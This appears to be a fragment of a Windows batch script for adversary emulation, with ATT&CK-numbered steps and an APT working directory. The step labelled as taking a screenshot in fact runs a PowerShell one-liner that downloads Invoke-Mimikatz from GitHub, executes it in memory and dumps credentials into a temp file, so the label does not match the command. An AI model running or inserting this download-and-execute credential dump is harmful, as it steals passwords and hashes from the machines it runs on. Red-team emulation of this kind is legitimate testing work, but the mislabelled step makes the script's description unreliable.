ECHO ===========================================================================
ECHO Takes Screenshot - T1119
ECHO Saves screenshot in working directory %APTDIR% ...
ping -n 5 127.0.0.1 > NUL

ECHO Getting screen-capture and saving to screenshot.png
powershell.exe "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" >> "%APTDIR%\moutput.tmp"
